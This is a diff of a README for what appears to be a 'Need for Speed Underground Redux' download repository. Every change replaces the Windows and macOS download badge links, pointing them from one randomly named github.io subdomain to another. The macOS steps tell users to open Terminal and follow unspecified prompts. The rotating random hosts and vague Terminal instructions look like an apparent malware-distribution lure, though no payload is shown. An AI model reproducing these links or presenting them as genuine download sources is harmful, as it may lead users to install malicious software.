@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Need%20for%20Speed%20Underground%20Redux-F9A825?style=for-the-badge&logo=github)](https://zdiweqqcluid.github.io/win-get/)
+[![Download](https://img.shields.io/badge/Download_Need%20for%20Speed%20Underground%20Redux-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -51,9 +51,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zdiweqqcluid.github.io/win-get/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://tlwbljvlzhgm.github.io/windows-install/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zdiweqqcluid.github.io/mac-get/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 </div>
 
@@ -63,7 +63,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Need%20for%20Speed%20Underground%20Redux-F9A825?style=for-the-badge&logo=github)](https://zdiweqqcluid.github.io/win-get/)
+[![Download](https://img.shields.io/badge/Download_Need%20for%20Speed%20Underground%20Redux-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -93,7 +93,7 @@
 
 ## macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zdiweqqcluid.github.io/mac-get/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 1. Open **Terminal** (`Cmd + Space` -> Terminal)
 2. Follow the on-screen prompts
